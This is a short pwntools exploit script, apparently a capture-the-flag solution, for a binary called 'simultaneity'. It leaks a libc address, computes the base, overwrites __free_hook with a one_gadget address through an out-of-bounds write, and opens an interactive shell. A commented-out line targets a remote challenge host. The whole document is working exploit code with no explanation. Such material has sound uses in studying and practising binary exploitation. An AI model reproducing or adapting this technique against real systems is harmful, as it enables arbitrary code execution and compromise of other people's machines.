

from pwn import *
context.log_level='debug'
p=process("./simultaneity")
#p=process(["./ld-linux-x86-64.so.2", "./simultaneity"], env={"LD_PRELOAD":"./libc.so.6"})
pid = gdb.attach(p,gdbscript="b * main+89")
#p=remote("mc.ax",31547)
#libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc=ELF("./libc.so.6")
p.sendlineafter("how big?","1000000000")
p.recvuntil("you are here: ")
leak=int(p.recvline()[:-1],16)

libc_base=leak+0x3b9acff0  #flat base
free_hook=libc_base+libc.sym['__free_hook']
one_gadget=libc_base+0xe5456
p.sendlineafter("how far?",str((free_hook-leak)/8))
print hex(libc_base)
print(hex(one_gadget))
print (free_hook-leak)/8
print(one_gadget)
#print(pidof(p)[0])
#pause()
pay="0"*0x400+str(one_gadget)
p.sendlineafter("what?\n",pay)
p.interactive()